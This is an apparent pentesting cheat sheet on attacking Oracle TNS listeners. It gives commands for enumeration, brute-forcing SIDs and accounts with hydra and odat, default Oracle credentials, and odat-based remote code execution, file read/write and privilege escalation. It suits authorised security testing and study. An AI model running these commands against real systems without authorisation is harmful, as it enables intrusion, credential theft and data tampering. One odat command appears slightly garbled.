---
description: Port 1521,1522-1529
---

# Oracle TNS

## Theory

Oracle clients communicate with the database using the Transparent Network Substrate (TNS) protocol. When the listener receives a connection request (1521/TCP, -you may also get secondary listeners on 1522–1529-), it starts up a new database process and establishes a connection between the client and the Oracle database.

## Practice&#x20;

### &#x20;**Enumerate v**ersion

{% tabs %}
{% tab title="nmap" %}
Using nmap scripts, we can enumerate the version of the TNS-Listener

```bash
nmap --script "oracle-tns-version" -p 1521 -T4 -sV <IP>
```
{% endtab %}

{% tab title="tnscmd10g" %}
We can enumerate the TNS-Listener using the [tnscmd10g](https://www.kali.org/tools/tnscmd10g/) tool

```bash
tnscmd10g version -p 1521 -h <IP>
```
{% endtab %}
{% endtabs %}

### **Commands & Brute-force**

{% tabs %}
{% tab title="tnscmd10g" %}
When enumerating Oracle the first step is to talk to the TNS-Listener

```bash
# Return the current status and variables used by the listener
tnscmd10g status -p 1521 -h <IP>

# Dump service data
tnscmd10g services -p 1521 -h <IP>

# Dump debugging information to the listener log
tnscmd10g debug -p 1521 -h <IP>

# Write the listener configuration file to a backup location
tnscmd10g save_config -p 1521 -h <IP>
```

{% hint style="danger" %}
If you **receive an error**, could be because **TNS versions are incompatible** (Use the `--10G` parameter with `tnscmd10`) and if the **error persist,** the listener may be **password protected**&#x20;
{% endhint %}

We can use hydra to brute-force TNS-Listener password

```bash
hydra -P rockyou.txt -t 32 -s 1521 <IP> oracle-listener
```
{% endtab %}
{% endtabs %}

### **Targeting** SID

The SID (Service Identifier) is essentially the database name, depending on the install you may have one or more default SIDs, or even a totally custom dba defined SID.

{% tabs %}
{% tab title="Bruteforce" %}
We can brute-force SID  using [Hydra](https://github.com/vanhauser-thc/thc-hydra) or [Odat](https://github.com/quentinhardy/odat)

```bash
#Using Hydra
hydra -L sid.txt -s 1521 <IP> oracle-sid

#Using odat
odatPLSEXTPROC sidguesser -s $SERVER -d $SID --sids-file=./sids.txt

# Interesting Wordilists
cat /usr/share/metasploit-framework/data/wordlists/sid.txt
cat /usr/share/nmap/nselib/data/oracle-sids
```
{% endtab %}

{% tab title="Enumerate" %}
In some old versions (in **9** it works) we can enumerate the SID using **`tnscmd10g`**

```bash
#The SID are inside: SERVICE=(SERVICE_NAME=<SID_NAME>)
tnscmd10g status-p 1521 -h <IP>
```
{% endtab %}
{% endtabs %}

### **Targeting Accounts**

Once we have found a valid SID, the next step is account enumeration. From this point, you can connect to the listener and brute-force credentials.

{% tabs %}
{% tab title="Bruteforce" %}
We can use [Hydra](https://github.com/vanhauser-thc/thc-hydra) or [odat](https://github.com/quentinhardy/odat), or [nmap](https://nmap.org/dist/) to bruteforce accounts on a known SID

```bash
#Odat
odat passwordguesser -s $SERVER -d $SID
odat passwordguesser -s $SERVER -d $SID -p 1521 --accounts-files users.txt pass.txt

#Hydra
hydra -L /tmp/user.txt -P /tmp/pass.txt -s 1521 $SERVER oracle /$SID

#Nmap
nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=$SID $SERVER
```

Here are **mixed** wordlistst taken from [hacktricks](https://book.hacktricks.xyz/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener)

{% file src="../../../.gitbook/assets/pass-oracle.txt" %}

{% file src="../../../.gitbook/assets/users-oracle.txt" %}
{% endtab %}

{% tab title="Default Passwords" %}
Below are some of the default passwords associated with Oracle:

* **DBSNMP/DBSNMP**  —  Intelligent Agent uses this to talk to the db server (its some work to change it)&#x20;
* **SYS/CHANGE\_ON\_INSTALL**  —  Default sysdba account before and including Oracle v9, as of version 10g this has to be different!&#x20;
* **PCMS\_SYS/PCMS\_SYS**  —  Default x account&#x20;
* **WMSYS/WMSYS**  —  Default x account&#x20;
* **OUTLN/OUTLN**  —  Default x account&#x20;
* **SCOTT/TIGER**  —  Default x account

Other default passwords can be found [here ](http://www.petefinnigan.com/default/oracle\_default\_passwords.htm)and [here](https://cirt.net/passwords?vendor=Oracle)
{% endtab %}

{% tab title="Steal Remote Pwds" %}

{% endtab %}
{% endtabs %}

### Logging into a Remote Database <a href="#00ef" id="00ef"></a>

{% tabs %}
{% tab title="Sqlplus" %}
To login using known credentials, we can use [sqlplus](https://book.hacktricks.xyz/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/oracle-pentesting-requirements-installation)

```bash
sqlplus <username>/<password>@<ip_address>:<port>/<SID>
```

{% hint style="danger" %}
If an **account has system database priviledges (sysdba) or system operator (sysop)** you may wish to try the following:

```bash
sqlplus <username>/<password>@<ip_address>/<SID> 'as sysdba'
sqlplus <username>/<password>@<ip_address>/<SID> 'as sysoper'
```
{% endhint %}
{% endtab %}
{% endtabs %}

### Remote Code Execution

{% hint style="danger" %}
If an **account has system database priviledges (sysdba) or system operator (sysop)** you may add following args when using odat:

```
--sysdba
--sysoper
```
{% endhint %}

{% tabs %}
{% tab title="Java" %}
We can try to execute code using [odat](https://github.com/quentinhardy/odat) Java Stored Procedure

```bash
odat java -s <IP> -U <username> -P <password> -d <SID> --exec COMMAND
```
{% endtab %}

{% tab title="Scheduler" %}
We can try to execute code using [odat](https://github.com/quentinhardy/odat) and Oracle Scheduler

```bash
odat dbmsscheduler -s <IP> -d <SID> -U <username> -P <password> --exec "C:\windows\system32\cmd.exe /c echo 123&gt;&gt;C:\hacK"
```
{% endtab %}

{% tab title="External Tables" %}
We can try to execute code using [odat](https://github.com/quentinhardy/odat) and Oracle External Tables

```bash
odat externaltable -s <IP> -U <username> -P <password> -d <SID> --exec "C:/windows/system32" "calc.exe"
```

{% hint style="info" %}
ODAT requires the privilege ‘CREATE ANY DIRECTORY’, which, by default, is granted only to DBA role, since it attempts to execute the file from any and not only “your” directory ([the manual version](../../../web/infrastructures/dbms/exploit-databases.md) of this attack requires less privileges).
{% endhint %}
{% endtab %}
{% endtabs %}

### Read/Write files

{% tabs %}
{% tab title="Utlfile" %}
We can try to read/write files using [odat](https://github.com/quentinhardy/odat) and utlfile

```bash
#Read file
odat utlfile -s <IP> -d <SID> -U <username> -P <password> --getFile "C:/RemotePath" remote_file.txt local_file.txt

#Write file
odat utlfile -s <IP> -d <SID> -U <username> -P <password> --putFile "C:/RemotePath" remote_file.txt local_file.txt

#Remove file
odat utlfile -s <IP> -d <SID> -U <username> -P <password> --removeFile "C:/RemotePath" remote_file.txt
```
{% endtab %}

{% tab title="External Tables" %}
We can try to read files using [odat](https://github.com/quentinhardy/odat) and Oracle External Tables

```bash
#Read file
odat externaltable -s <IP> -U <username> -P <password> -d <SID> --getFile "C:/RemotePath" remote_file.txt local_file.txt
```
{% endtab %}
{% endtabs %}

### Elevating Privileges

{% tabs %}
{% tab title="odat" %}
We may use the [privesc](https://github.com/quentinhardy/odat/wiki/privesc) module from odat to escalate privileges. In that link you can find **several ways to escalate privileges using odat.**

```bash
#Get module Help
odat privesc -s $SERVER -d $ID -U $USER -P $PASSWORD -h
```
{% endtab %}
{% endtabs %}

### Automation Tools

{% tabs %}
{% tab title="oscanner" %}
**An interesting tool is oscanner**, which will try to get some valid SID and then it will brute-force for valid credentials and try to extract some information:

```bash
#apt install oscanner
oscanner -s <IP> -P <PORT>
```
{% endtab %}

{% tab title="odat" %}
Another tool that will do all of this is [odat](https://github.com/quentinhardy/odat)

```bash
# Bruteforce SID and check all
odat all -s <IP> -p <PORT>

# Bruteforce accounts for that SID and check all
odat all -s <IP> -p <PORT> -d <SID>

# Check all for that acccount
odat all -s <IP> -p <PORT> -d <SID> -U <USER> -P <PASSWORD>

# Check all for that acccount as SYSDBA or SYSOPER
odat all -s <IP> -p <PORT> -d <SID> -U <USER> -P <PASSWORD> --sysdba
odat all -s <IP> -p <PORT> -d <SID> -U <USER> -P <PASSWORD> --sysoper
```
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://book.hacktricks.xyz/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener" %}
